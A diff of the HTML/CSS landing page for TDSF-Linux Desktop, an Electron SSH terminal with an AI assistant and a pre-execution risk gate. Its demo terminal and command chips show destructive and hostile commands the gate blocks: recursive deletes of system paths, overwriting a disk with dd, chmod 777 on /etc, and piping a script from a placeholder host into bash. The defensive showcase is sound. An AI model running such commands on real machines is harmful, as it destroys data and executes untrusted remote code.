+     位移最多让人看见一段 20px 的错位，永远不至于空白。 */
+  @keyframes rv { from { transform: translateY(20px); } to { transform: none; } }
+  @supports (animation-timeline: view()) {
+    @media (prefers-reduced-motion: no-preference) {
+      [data-rv] { animation: rv both; animation-timeline: view(); animation-range: entry 0% entry 60%; }
+    }
+  }
+
+  @media (max-width: 1000px) {
+    .hero-in { grid-template-columns: minmax(0, 1fr); }
+    .guard { grid-template-columns: minmax(0, 1fr); }
+    .procs, .arch-lower { grid-template-columns: minmax(0, 1fr); }
+    .steps { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 26px; }
+    .rail-line, .rail-fill { display: none; }
+  }
+  @media (max-width: 680px) {
+    body { font-size: 16px; }
+    .index { grid-template-columns: minmax(0, 1fr); }
+    .row:nth-last-child(-n+2) { border-bottom: 1px solid var(--rule); }
+    .row:last-child { border-bottom: none; }
+    .versus { grid-template-columns: minmax(0, 1fr); }
+    .vline { display: none; }
+    .steps { grid-template-columns: minmax(0, 1fr); }
+    .head-row { grid-template-columns: minmax(0, 1fr); gap: 10px; }
+    .head-row .idx { text-align: left; }
+    .tbl thead { display: none; }
+    .tbl, .tbl tbody, .tbl tr, .tbl td { display: block; }
+    .tbl tr { padding: 15px 0; border-bottom: 1px solid var(--rule); }
+    .tbl tbody tr:last-child { border-bottom: none; }
+    .tbl td { padding: 0; border: none; }
+    .tbl td + td { margin-top: 4px; }
+    .tbl td.v, .tbl td.k { white-space: normal; }
+    .foot-grid { grid-template-columns: minmax(0, 1fr); }
   }
 </style>
 </head>
 <body>
+<div class="bar" id="bar" aria-hidden="true"></div>
 
-<header class="top">
-  <div class="wrap top-inner">
-    <div class="brand">TDSF<span>·</span>LINUX DESKTOP</div>
-    <nav>
+<header class="nav">
+  <div class="shell nav-in">
+    <div class="mark">
+      <svg width="20" height="20" viewBox="0 0 32 32" aria-hidden="true"><rect width="32" height="32" rx="7" fill="#0f6cbd"/><path d="M9 12l4 4-4 4M16 20h7" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <b>TDSF</b>·LINUX&nbsp;DESKTOP
+    </div>
+    <nav class="nav-links" aria-label="页面分区">
+      <a href="#demo">演示</a>
+      <a href="#why">为什么</a>
       <a href="#features">能力</a>
+      <a href="#guard">拦截</a>
       <a href="#screens">界面</a>
       <a href="#arch">架构</a>
-      <a href="#trust">可信决策</a>
+      <a href="#trust">链路</a>
+      <a href="#stack">技术栈</a>
       <a href="#quality">质量</a>
+      <a href="#status">边界</a>
     </nav>
   </div>
 </header>
 
-<div class="wrap">
+<main>
 
-  <div class="hero">
-    <div class="kicker">Electron 桌面应用 · 本地优先</div>
-    <h1>让第一次连上 Linux 服务器的人，<br>敢敲下一条命令</h1>
-    <p class="lede">
-      TDSF-Linux Desktop 把 SSH 终端、AI 助手、高危命令拦截与决策留痕放进同一个窗口。
-      AI 不替你按下回车——它先说清要执行什么、依据是什么、失败会怎样，再由你确认；
-      你自己敲的命令同样会过一遍风险检查。
-    </p>
-    <div class="chips">
-      <span class="chip">Electron <b>43</b> + React <b>19</b></span>
-      <span class="chip">终端 <b>xterm.js</b> + 命令/输出分块</span>
-      <span class="chip">模型 <b>可指向本机 Ollama</b></span>
-      <span class="chip">数据 <b>只存本机 SQLite</b></span>
+<section class="hero" id="demo">
+  <div class="hero-glow" aria-hidden="true"></div>
+  <div class="shell hero-in">
+    <div>
+      <span class="hero-live" data-rv><span class="live-dot" aria-hidden="true"></span>本机真实运行 · 2026-10-18 读数</span>
+      <h1 data-rv><span class="seg">让第一次连上</span> <span class="seg">Linux 服务器的人，</span><br><em>敢敲下一条命令</em></h1>
+      <p class="lede" data-rv>
+        SSH 终端、AI 助手、高危命令拦截、决策留痕放在同一个窗口。
+        AI 不替你按下回车——它先说清要执行什么、依据是什么、失败会怎样；
+        你自己敲的命令，也过同一道闸。
+      </p>
+      <div class="cta" data-rv>
+        <a class="btn btn-solid" href="#guard">看它拦下一条命令</a>
+        <a class="btn btn-ghost" href="#screens">真实界面截图</a>
+      </div>
+      <div class="stack-line" data-rv>
+        <b>Electron 43</b> · <b>React 19</b> · <b>xterm.js</b> 命令块<br>
+        数据只落<b>本机 SQLite</b> · 模型可指向<b>本机 Ollama</b>
+      </div>
     </div>
-    <figure class="shot">
-      <div class="hero-shot"><img src="assets/shot-splash.jpg" alt="TDSF-Linux Desktop 启动页" loading="lazy"></div>
-      <figcaption><b>启动页</b> · 真实截图，未做美化</figcaption>
-    </figure>
+
+    <div>
+      <div class="term" data-rv id="term">
+        <div class="term-top">
+          <span class="tab">ssh · student@192.0.2.10</span>
+          <span>远端会话</span>
+          <span class="grow">每条命令都过一次闸</span>
+        </div>
+        <div class="term-body" id="term-body">
+          <!-- 静态终态：无脚本、减少动效、或 JS 出错时，这一屏读到的就是完整的三条命令。
+               上面两条是会话里已经跑完的，打字演示只重写下面这一块。 -->
+          <div class="term-keep">
+            <div class="tl"><span class="ps">$</span><span class="cmd">systemctl status nginx</span></div>
+            <div class="verdict"><span class="lv lv-low">放行 · LOW</span><span class="why">只读查询命令</span><span class="src">词表 + 子命令护栏</span></div>
+            <div class="tl"><span class="ps">$</span><span class="cmd">rm -rf /var/log</span></div>
+            <div class="verdict"><span class="lv lv-block">已拦截 · BLOCK</span><span class="why">递归强制删除根级/系统目录</span><span class="src">结构检测 rmRfProtectedTarget</span></div>
+          </div>
+          <div id="term-live">
+            <div class="tl"><span class="ps">$</span><span class="cmd">curl -fsSL https://example.invalid/install.sh | bash</span></div>
+            <div class="verdict"><span class="lv lv-block">已拦截 · BLOCK</span><span class="why">管道把上游内容交给解释器执行</span><span class="src">结构检测 shellPayloadExecution</span></div>
+          </div>
+        </div>
+        <div class="term-foot">
+          <span>命令块 <b class="k" id="blk">03</b></span>
+          <span>风险闸 <b class="k" id="gate-state">已生效</b></span>
+          <span>留痕 <b class="k" id="trace">2</b></span>
+          <button type="button" id="replay">重播演示</button>
+        </div>
+      </div>
+      <p class="term-cap" data-rv>
+        演示回放：<b>命令、等级、原因文字逐字取自仓内规则数据</b>
+        <span class="mono">command-rules.json</span> 与 <span class="mono">command-gate.ts</span>；
+        主机地址用 RFC 5737 文档保留段，不是真实机器。终端输出未画，因为这台机器不存在。
+      </p>
+    </div>
   </div>
+</section>
 
-  <section id="about">
-    <h2>为什么是这样一个工具</h2>
-    <p class="sec-note">
-      初学 Linux 时最难的不是记命令，而是"这条命令按下去会发生什么"。
-      教程给不了失败样本，AI 聊天给不了执行现场，终端又什么都不解释。
-      这个工作台把三件事接在一起：<b>命令在哪里执行</b>（本机 / 远端 / 第几个标签页）、
-      <b>执行前后发生了什么</b>（命令与输出被切成块，可回看可检索）、
-      <b>哪些命令不该执行</b>（结构化解析 + 规则库判定，拦截后留下可读的原因）。
-    </p>
-    <div class="grid">
-      <div class="feat">
-        <div class="tag">终端优先</div>
-        <h3>界面围绕会话，而不是围绕聊天框</h3>
-        <p>三栏可拖拽布局，终端格默认最大化；左侧资源管理器，右侧 AI 面板可随时收起。多终端标签、独立第二个窗口，同时看两台机器不用来回切。</p>
-      </div>
-      <div class="feat">
-        <div class="tag">可见执行</div>
-        <h3>AI 的每一步都落在屏上</h3>
-        <p>思考过程、工具调用、待执行命令、返回结果分开展示；上下文占用按模型真实窗口计算，用量与估算分开标注，不拿估出来的数字冒充实测。</p>
+<section class="topo" id="topo" aria-label="会话拓扑示意">
+  <div class="topo-stage"><canvas id="topo-canvas" aria-hidden="true"></canvas></div>
+  <div class="shell">
+    <div class="topo-cap">
+      <p data-rv>示意图：一台本机同时挂着多个远端会话。<b>每条命令和它的输出按会话切成块</b>，拦截与留痕也按会话归属分开存；上面那个终端里每判一条命令，这里就发一颗包。</p>
+      <div class="topo-legend" data-rv>
+        <span><i class="lg lg-hub" aria-hidden="true"></i>本机</span>
+        <span><i class="lg lg-node" aria-hidden="true"></i>远端会话</span>
+        <span><i class="lg lg-pkt" aria-hidden="true"></i>命令下发 / 输出回推</span>
+        <span><i class="lg lg-block" aria-hidden="true"></i>被风险闸拦下</span>
       </div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <section id="features">
-    <h2>核心能力</h2>
-    <p class="sec-note">以下每一项都对应界面里真实存在的入口，未接线的占位功能不写在这里。</p>
-    <div class="grid">
-      <div class="feat">
-        <div class="tag">01 · 终端</div>
-        <h3>SSH 与本机终端，同一套语义</h3>
-        <ul>
-          <li>xterm.js 渲染，Fit / Search / 链接识别插件</li>
-          <li>本机终端走 node-pty，远端走 ssh2，两侧命令块口径一致</li>
-          <li>OSC 133 / 633 标记切分"命令—输出"块，供 AI 与历史检索消费</li>
-          <li>跳板机连接同样校验主机密钥</li>
-        </ul>
+<section id="why">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>难的不是记命令，<br>是按下回车之前那段空白</h2>
+        <p class="sec-lede" data-rv>
+          教程给不了失败样本，聊天框给不了执行现场，终端什么都不解释。
+          这个工作台把三件事接起来：命令在哪里执行、执行前后发生了什么、哪些命令不该执行。
+        </p>
       </div>
-      <div class="feat">
-        <div class="tag">02 · 命令安全</div>
-        <h3>拦截发生在执行之前</h3>
-        <ul>
-          <li>规则以数据文件维护：10 类判定、200 余条判定项</li>
-          <li>tree-sitter-bash 做结构化解析，绕过词表的写法（重定向、命令替换、find -exec）另走一层</li>
-          <li>人敲的、粘贴的、AI 发起的命令过同一道闸</li>
-          <li>每次拦截留痕，给出原因与替代建议</li>
-        </ul>
+      <div class="idx" data-rv>拦在按下回车<br>之前，不是事后</div>
+    </div>
+
+    <div class="versus">
+      <div class="v-col" data-rv>
+        <div class="v-title">没有这道闸的时候</div>
+        <div class="frag">$ rm -rf /var/l<span>og</span>　<span>→ 三分钟后发现日志没了，且没有撤销</span></div>
+        <div class="frag">$ curl … | bash　<span>→ 脚本内容没人看过，已经在跑了</span></div>
+        <div class="frag">$ chmod 777 /etc<span> → 报错之前，权限已经放开</span></div>
+        <p>初学者的代价通常是“这台虚机废了，重装”。教学环境里，这等于放弃动手。</p>
       </div>
-      <div class="feat">
-        <div class="tag">03 · AI 助手</div>
-        <h3>流式、可中断、可降级</h3>
-        <ul>
-          <li>诊断 / 部署 / 巡检 / 回滚四种工作模式，PAOR 循环编排</li>
-          <li>24 个受控工具（SSH、日志、监控、知识库、可信度、沙箱审批）经主进程派发</li>
-          <li>请求级总超时 + 单一重试栈，重试不重复推送已吐出的字</li>
-          <li>模型侧失败时给出可操作的降级路径，而不是一个红色报错</li>
-        </ul>
-      </div>
-      <div class="feat">
-        <div class="tag">04 · 可信决策</div>
-        <h3>结论后面挂着证据链</h3>
-        <ul>
-          <li>多源证据加权融合（Dempster 规则 + PCR5 冲突再分配）</li>
-          <li>雷达图显示每条证据的贡献与冲突流向，可逐项展开</li>
-          <li>决策记录持久化，事后能查"当时依据是什么"</li>
-        </ul>
-      </div>
-      <div class="feat">
-        <div class="tag">05 · 知识库</div>
-        <h3>离线可查的运维知识</h3>
-        <ul>
-          <li>命令词典、教程、故障案例三类条目，断网可用</li>
-          <li>本地嵌入模型 + SQLite 向量索引做语义检索，不依赖外部 API</li>
-          <li>读者答复（有帮助 / 没帮助）回灌条目成功率，逐次累积</li>
-        </ul>
-      </div>
-      <div class="feat">
-        <div class="tag">06 · 监控与日志</div>
-        <h3>这台机器现在怎么样</h3>
-        <ul>
-          <li>CPU / 内存 / 磁盘 / 网络定时采样，阈值可配</li>
-          <li>告警按"会话 + 种类"稳定编号，标记已处理会真的改变状态，指标回落后自动作废</li>
-          <li>日志分析、系统事件与操作历史可交叉检索</li>
-        </ul>
-      </div>
-      <div class="feat">
-        <div class="tag">07 · 文件与预览</div>
-        <h3>改远端文件不必离开窗口</h3>
-        <ul>
-          <li>SFTP 文件树 + Monaco 编辑器，编辑器资源本地打包，不请求 CDN</li>
-          <li>路径写入范围受限，越界操作需要先经确认</li>
-          <li>预览面板经 SSH 端口转发打开远端服务，句柄协议限制可访问范围</li>
-        </ul>
-      </div>
-      <div class="feat">
-        <div class="tag">08 · 本地优先</div>
-        <h3>数据与凭据留在本机</h3>
-        <ul>
-          <li>服务器信息、历史、知识库存在本地 SQLite，凭据只在主进程边界内使用</li>
-          <li>日志、报错、AI 上下文出边界前统一脱敏</li>
-          <li>模型可指向本机 Ollama，全链路不出内网</li>
-        </ul>
+      <div class="vline" aria-hidden="true"></div>
+      <div class="v-col ok" data-rv>
+        <div class="v-title">现在发生的顺序</div>
+        <p><b>先分词，再切段。</b>引号里的 <span class="mono">; | &amp;&amp;</span> 不算分隔符，
+          所以 <span class="mono">bash -c "rm -rf /; echo x"</span> 不会被撕成两段绕过。</p>
+        <p><b>写法变体同判。</b><span class="mono">rm -rf /</span>、<span class="mono">rm -rf "/"</span>、
+          <span class="mono">rm -rf //</span> 归一后再比受保护清单。</p>
+        <p><b>三个入口一条闸。</b>人敲的、粘贴的、AI 发起的命令，都从同一个执行口出去。</p>
+        <p><b>拦下要能说清。</b>每次拦截留痕：命中哪条规则、为什么、替代做法是什么。</p>
       </div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <section id="screens">
-    <h2>界面预览</h2>
-    <p class="sec-note">取自自动化验收脚本对真实运行窗口的截图，未替换内容、未做后期。</p>
-    <figure class="shot">
-      <div class="shot-frame"><img src="assets/shot-workbench.png" alt="工作台：资源管理器、终端区与 AI 面板三栏布局" loading="lazy"></div>
-      <figcaption><b>工作台</b> · 左：服务器与文件树；中：终端（未连接时的引导态）；右：AI 运维助手与模式标签</figcaption>
-    </figure>
-    <figure class="shot">
-      <div class="shot-frame"><img src="assets/shot-knowledge.png" alt="运维知识库列表页" loading="lazy"></div>
-      <figcaption><b>运维知识库</b> · 搜索 + 分类标签 + 匹配度，右侧热门知识与最近浏览</figcaption>
-    </figure>
-  </section>
+<section id="features">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>八项能力，<br>每项都对得上界面上真存在的入口</h2>
+        <p class="sec-lede" data-rv>未接线的占位功能不写在这里。没有生产者的统计值不显示在界面上。</p>
+      </div>
+      <div class="idx" data-rv>8 项<br>每项都有界面入口</div>
+    </div>
 
-  <section id="arch">
-    <h2>架构</h2>
-    <p class="sec-note">
-      三进程分离。渲染层拿不到 Node 能力，所有敏感操作经 preload 暴露的类型化通道进入主进程；
-      通道清单由单一契约文件生成，渲染层与主进程共用同一份类型。
-    </p>
-    <div class="arch">
-      <div class="proc">
-        <div class="role">主进程 · Node.js</div>
-        <h3>能力与判定</h3>
-        <p>SSH2 连接池、node-pty、SQLite、风险引擎、可信度融合、LLM 客户端、MCP 服务、调度器。</p>
+    <div class="index">
+      <div class="row" data-rv><div class="key">terminal</div><div><h3>终端优先，不是聊天框优先</h3><p>三栏可拖拽，终端格默认最大化；多标签、独立第二窗口，同时看两台机器不来回切。拖出来的宽度会记住。</p></div></div>
+      <div class="row" data-rv><div class="key">blocks</div><div><h3>命令与输出切成块</h3><p>OSC 133 / 633 标记把一次命令和它的输出缝成一块，可回看、可检索，也是 AI 读上下文的单位。</p></div></div>
+      <div class="row" data-rv><div class="key">gate</div><div><h3>拦截发生在执行之前</h3><p>词表规则 + tree-sitter-bash 结构化解析 + 只读白名单，输出等级、命中依据、影响范围；拦下的那些不会落进 shell。</p></div></div>
+      <div class="row" data-rv><div class="key">agent</div><div><h3>AI 的每一步落在屏上</h3><p>思考、工具调用、待执行命令、返回结果分开展示；诊断 / 部署 / 巡检 / 回滚四种模式走同一套编排，流式可中断。</p></div></div>
+      <div class="row" data-rv><div class="key">context</div><div><h3>用量说清是实测还是估算</h3><p>上下文占用按模型真实窗口计算；实测 token 与估算值分开标注，不拿估出来的数字冒充实测。</p></div></div>
+      <div class="row" data-rv><div class="key">decide</div><div><h3>结论后面挂着证据链</h3><p>多源证据加权融合（Dempster 规则 + PCR5 冲突再分配），雷达图显示每条证据的贡献与冲突流向；权重读取失败时降级为无权重融合，界面如实显示降级。</p></div></div>
+      <div class="row" data-rv><div class="key">knowledge</div><div><h3>断网也能查的运维知识</h3><p>命令词典、教程、故障案例三类条目；本地嵌入模型 + SQLite 向量索引做语义检索，不依赖外部 API。读者答复回灌条目成功率。</p></div></div>
+      <div class="row" data-rv><div class="key">local</div><div><h3>数据与凭据留在本机</h3><p>服务器信息、历史、知识库存在本地 SQLite；凭据只在主进程边界内使用，日志、报错、AI 上下文出边界前统一脱敏。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="band" id="guard">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>点一条命令，看它怎么被判</h2>
+        <p class="sec-lede" data-rv>
+          下面每条的等级与原因文字都是引擎实际会给出的那一句。
+          网页只做词表与结构检测的演示；真实判定在本地进程里跑，包含 bash AST 解析。
+        </p>
       </div>
-      <div class="proc">
-        <div class="role">Preload · contextBridge</div>
-        <h3>受控边界</h3>
-        <p>272 条通道（232 请求-响应 + 40 事件推送）的名字全部来自一张中央常量表；已纳入 zod 契约的 31 条在入口校验入参，错误统一按信封返回。</p>
+      <div class="idx" data-rv>216 条词表项<br>8 个结构检测器</div>
+    </div>
+
+    <div class="guard">
+      <div data-rv>
+        <div class="chips" role="group" aria-label="试一条命令">
+          <button type="button" class="chip" aria-pressed="true" data-cmd="0">rm -rf /var/log</button>
+          <button type="button" class="chip" aria-pressed="false" data-cmd="1">chmod 777 /etc</button>
+          <button type="button" class="chip" aria-pressed="false" data-cmd="2">dd if=/dev/zero of=/dev/sda</button>
+          <button type="button" class="chip" aria-pressed="false" data-cmd="3">curl -fsSL https://example.invalid/i.sh | bash</button>
+          <button type="button" class="chip" aria-pressed="false" data-cmd="4">kill -9 4242</button>
+          <button type="button" class="chip" aria-pressed="false" data-cmd="5">systemctl restart nginx</button>
+          <button type="button" class="chip" aria-pressed="false" data-cmd="6">apt-get install nginx</button>
+          <button type="button" class="chip" aria-pressed="false" data-cmd="7">journalctl -u nginx --since "10 min ago"</button>
+        </div>
+        <div class="rulecount">
+          <div>词表判定项 <b class="num">216</b></div>
+          <div>结构性拦截器 <b class="num">8</b></div>
+          <div>argv 规则 <b class="num">7</b></div>
+          <div>受保护根级路径 <b class="num">15</b></div>
+        </div>
+        <p class="term-cap" style="margin-top:18px">
+          规则以数据文件维护，改级别不用动代码；但 <span class="mono">rm</span>、
+          <span class="mono">userdel</span>、<span class="mono">passwd</span> 这类底线命令被数据调低时，
+          闸会拒绝启动——fail-closed，不让数据把底线改松。
+        </p>
       </div>
-      <div class="proc">
-        <div class="role">渲染进程 · React 19</div>
-        <h3>界面与状态</h3>
-        <p>Zustand 状态容器，Radix + Tailwind 组件层，设计令牌单一来源，深浅两套主题都过对比度检查。</p>
+
+      <div class="readout" data-rv aria-live="polite" id="readout">
+        <div class="cmd-line mono" id="ro-cmd">rm -rf /var/log</div>
+        <div class="verdict-big"><span class="lv lv-block" id="ro-lv">已拦截 · BLOCK</span><span class="reason" id="ro-why">递归强制删除根级/系统目录</span></div>
+        <div class="meta"><span class="k">由哪一层判出</span><span id="ro-src">结构检测器 rmRfProtectedTarget（rm 递归 + 强制 + 目标命中受保护清单）</span></div>
+        <div class="meta"><span class="k">执行会怎样</span><span id="ro-fx">命令不会送进 shell，拦截记录写入本地留痕，界面给出替代做法。</span></div>
       </div>
     </div>
-    <div class="rule">
-      <b>沙箱三原则保持不动：</b>contextIsolation 开启、nodeIntegration 关闭、sandbox 开启。
-      新增能力优先落在主进程，渲染层只负责呈现与发起请求。
-    </div>
-  </section>
+  </div>
+</section>
 
-  <section id="trust">
-    <h2>一条 AI 建议从生成到执行</h2>
-    <p class="sec-note">这条链路是产品的核心承诺：任何改动远端状态的命令，都要走完这四步才会落到终端。</p>
-    <div class="flow">
-      <div class="step">
-        <div>
-          <h3>生成</h3>
-          <p>模型基于终端上下文、命令块历史与知识库给出建议，工具调用在流式过程中即时展示，不事后补写。</p>
+<section id="screens">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>界面长这样</h2>
+        <p class="sec-lede" data-rv>两张图都由自动化脚本从真实运行窗口截取，未替换内容、未做后期。点开放大。</p>
+      </div>
+      <div class="idx" data-rv>2 张<br>脚本取自运行窗口</div>
+    </div>
+
+    <div class="plates">
+      <button type="button" class="plate-btn" data-plate="assets/shot-workbench.png" data-rv>
+        <div class="plate-frame"><img src="assets/shot-workbench.png" alt="工作台三栏布局：左侧服务器与文件树，中间终端，右侧 AI 运维助手" loading="lazy"></div>
+        <div class="plate-cap">
+          <h3>工作台</h3><p>左：服务器与文件树；中：终端（未连接时给引导，不放示例数据）；右：AI 面板与模式标签。三条栏的顶边取同一个 40px 令牌对齐。</p>
+          <span class="zoom">点击放大</span>
+        </div>
+      </button>
+      <button type="button" class="plate-btn" data-plate="assets/shot-knowledge.png" data-rv>
+        <div class="plate-frame"><img src="assets/shot-knowledge.png" alt="运维知识库列表页：搜索框、分类标签、匹配度与右侧热门知识" loading="lazy"></div>
+        <div class="plate-cap">
+          <h3>运维知识库</h3><p>搜索 + 分类标签 + 匹配度，右侧热门知识与最近浏览。匹配度来自本地向量检索的真实分数，不是装饰。</p>
+          <span class="zoom">点击放大</span>
+        </div>
+      </button>
+    </div>
+  </div>
+</section>
+
+<section class="band" id="arch">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>三进程，一条受控边界</h2>
+        <p class="sec-lede" data-rv>渲染层拿不到 Node 能力。所有敏感操作经 preload 暴露的类型化通道进主进程；通道名由一张中央常量表出，已登记契约的通道在入口校验入参。</p>
+      </div>
+      <div class="idx" data-rv>272 条通道<br>35 条已登记契约</div>
+    </div>
+
+    <div class="arch-stack">
+      <div class="procs" data-rv>
+        <div class="proc">
+          <div class="role">渲染进程 · React 19</div>
+          <h3>只呈现与发起请求</h3>
+          <p>Zustand 状态容器，Radix + Tailwind 组件层，设计令牌单一来源。沙箱隔离，拿不到 Node 能力。</p>
+        </div>
+        <div class="proc">
+          <div class="role">Preload · contextBridge</div>
+          <h3>受控边界</h3>
+          <p>通道名全部来自一张中央常量表；已登记契约的通道在入口校验入参，错误统一按信封返回。</p>
+        </div>
+        <div class="proc">
+          <div class="role">主进程 · Node.js</div>
+          <h3>能力与判定</h3>
+          <p>ssh2 连接池、node-pty、SQLite、风险引擎、可信度融合、LLM 客户端、MCP 服务、调度器。</p>
         </div>
       </div>
-      <div class="step">
-        <div>
-          <h3>判定</h3>
-          <p>命令进风险引擎：词表规则 + bash AST 解析 + 只读白名单，输出风险等级、命中依据与影响范围。</p>
-        </div>
+
+      <svg class="trunk" viewBox="0 0 1200 34" preserveAspectRatio="none" role="img" aria-label="渲染进程向主进程发起 232 条请求-响应调用，主进程向界面回推 40 条事件">
+        <path class="t-edge" d="M0 12 H1200"/>
+        <path class="t-fwd" d="M0 12 H1200"/>
+        <path class="t-edge" d="M0 24 H1200"/>
+        <path class="t-back" d="M1200 24 H0"/>
+      </svg>
+      <div class="trunk-cap" data-rv>
+        <span><b>invoke</b> 232 条 请求-响应 →</span>
+        <span><b>event</b> 40 条 事件推送 ←</span>
+        <span><b>已登记契约</b> 35 条</span>
       </div>
-      <div class="step">
-        <div>
-          <h3>确认</h3>
-          <p>决策卡由主进程构造（模型无法伪造自己的"已批准"），界面显示准备执行什么、在哪台机器、失败怎么回滚。</p>
+
+      <div class="arch-lower">
+        <div class="funnel" data-rv>
+          <h3>命令执行口</h3>
+          <p>人敲的 / 粘贴的 / AI 发起的 → 同一条风险闸 → 通过才送进 shell。拦截在此发生，留痕也在此写入。</p>
         </div>
-      </div>
-      <div class="step">
-        <div>
-          <h3>留痕</h3>
-          <p>执行结果与当时的证据构成写入本地记录，事后在决策页可回查；拦截同样留痕，包含被拦下的原因。</p>
+        <div class="sandbox" data-rv>
+          <h3>Electron 安全三原则保持不动</h3>
+          <ul>
+            <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#7ee081" stroke-width="2" fill="none" stroke-linecap="round"/></svg>contextIsolation: true</li>
+            <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#7ee081" stroke-width="2" fill="none" stroke-linecap="round"/></svg>nodeIntegration: false</li>
+            <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#7ee081" stroke-width="2" fill="none" stroke-linecap="round"/></svg>sandbox: true</li>
+          </ul>
+          <p>新增能力优先落在主进程。日志、报错、AI 上下文在离开进程边界前统一脱敏；凭据不进渲染层，也不进任何文本产物。</p>
         </div>
       </div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <section id="stack">
-    <h2>技术栈</h2>
-    <table>
-      <thead><tr><th>层</th><th>选型</th></tr></thead>
-      <tbody>
-        <tr><td>桌面框架</td><td>Electron 43（contextIsolation / sandbox 全开）</td></tr>
-        <tr><td>界面</td><td>React 19 + TypeScript + Zustand 5 + Radix UI + Tailwind + lucide-react</td></tr>
-        <tr><td>终端</td><td>xterm.js 5 + node-pty（本机）+ ssh2（远端）</td></tr>
-        <tr><td>编辑器</td><td>Monaco 0.56，资源本地打包，无 CDN 依赖</td></tr>
-        <tr><td>AI</td><td>Vercel AI SDK 7 + 官方 MCP SDK 1.32，Anthropic / Google / OpenAI 兼容端，支持本机 Ollama</td></tr>
-        <tr><td>命令解析</td><td>web-tree-sitter + tree-sitter-bash</td></tr>
-        <tr><td>存储</td><td>better-sqlite3 + sqlite-vec 向量索引，@xenova/transformers 本地嵌入</td></tr>
-        <tr><td>可观测</td><td>Langfuse 追踪（未配置密钥时自动关闭，不影响主流程）</td></tr>
-        <tr><td>测试</td><td>Vitest 2 + Playwright（直驱 Electron 窗口）</td></tr>
-      </tbody>
-    </table>
-  </section>
-
-  <section id="quality">
-    <h2>质量与验证</h2>
-    <p class="sec-note">下面每个数字都在 2026-10-18 由本机脚本重新量过（用例数取 vitest 汇总，通道数取 <code>npm run audit:ipc</code>）；界面上不出现没有生产者的统计值。</p>
-    <div class="stats">
-      <div class="stat"><div class="n">3249</div><div class="l">单元与组件用例通过（270 个测试文件，0 失败，19 条按环境跳过）</div></div>
-      <div class="stat"><div class="n">59</div><div class="l">端到端用例通过（Playwright 直驱真实应用窗口，另 13 条按环境跳过）</div></div>
-      <div class="stat"><div class="n">508</div><div class="l">TypeScript / TSX 源文件</div></div>
-      <div class="stat"><div class="n">272</div><div class="l">IPC 通道：232 条请求-响应 + 40 条事件推送</div></div>
-      <div class="stat"><div class="n">24</div><div class="l">AI 可调用的受控工具（六个域注册表去重后的名字数）</div></div>
+<section id="trust">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>一条 AI 建议从生成到执行</h2>
+        <p class="sec-lede" data-rv>这是产品的核心承诺：任何改动远端状态的命令，都要走完这四步才会落到终端。</p>
+      </div>
+      <div class="idx" data-rv>4 步<br>改远端状态都要走完</div>
     </div>
-    <h3 style="margin:22px 0 10px;font-size:1.02rem">每次提交前会跑红的门禁</h3>
-    <div class="gates">
-      <span class="gate">ESLint</span>
-      <span class="gate">TypeScript 类型检查</span>
-      <span class="gate">测试代码类型零错</span>
-      <span class="gate">死代码闸</span>
-      <span class="gate">设计契约闸（令牌单源）</span>
-      <span class="gate">界面可读性审计（含浅色模式对比度）</span>
-      <span class="gate">IPC 契约一致性</span>
-      <span class="gate">本地密钥扫描</span>
-      <span class="gate">Git 历史凭据回归扫描</span>
-      <span class="gate">内网拓扑按值核对</span>
-      <span class="gate">只写不读状态键检测</span>
-    </div>
-  </section>
 
-  <section id="status">
-    <h2>当前状态与边界</h2>
-    <div class="honest">
-      <ul>
-        <li>项目仍在持续开发，源码仓库当前为私有状态，暂未公开发布安装包；需要试用或源码请通过下方联系方式沟通。</li>
-        <li>可信度融合在证据权重读取失败时降级为无权重融合，界面会如实显示降级，不会静默给一个"看起来更准"的数字。</li>
-        <li>监控、日志与远端文件相关能力需要先连接一台 Linux 服务器；未连接时界面显示空状态而不是示例数据。</li>
-        <li>AI 能力取决于所配置的模型，本地小模型下工具调用的稳定性会明显下降，此时建议只用于解释与诊断。</li>
+    <div class="rail">
+      <div class="rail-line" aria-hidden="true"></div>
+      <div class="rail-fill" id="rail-fill" aria-hidden="true"></div>
+      <div class="steps">
+        <div class="step" data-step><div class="node">1</div><h3>生成</h3><p>模型基于终端上下文、命令块历史与知识库给出建议，工具调用在流式过程中即时展示，不事后补写。</p></div>
+        <div class="step" data-step><div class="node">2</div><h3>判定</h3><p>命令进风险引擎：词表 + AST + 只读白名单，输出风险等级、命中依据与影响范围。</p></div>
+        <div class="step" data-step><div class="node">3</div><h3>确认</h3><p>决策卡由主进程构造——模型无法伪造自己的“已批准”。界面显示准备执行什么、在哪台机器、失败怎么回滚。</p></div>
+        <div class="step" data-step><div class="node">4</div><h3>留痕</h3><p>执行结果与当时的证据构成写入本地记录，事后在决策页可回查；被拦下的同样留痕，含原因。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="band" id="stack">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>技术栈</h2>
+        <p class="sec-lede" data-rv>选型的判据只有一条：能不能让上面那四步真的跑起来，并且跑得起来还查得到依据。</p>
+      </div>
+      <div class="idx" data-rv>9 层<br>无 CDN 依赖</div>
+    </div>
+    <div data-rv>
+      <table class="tbl">
+        <thead><tr><th>层</th><th>选型</th></tr></thead>
+        <tbody>
+          <tr><td class="k">桌面框架</td><td>Electron 43（contextIsolation / sandbox 全开）</td></tr>
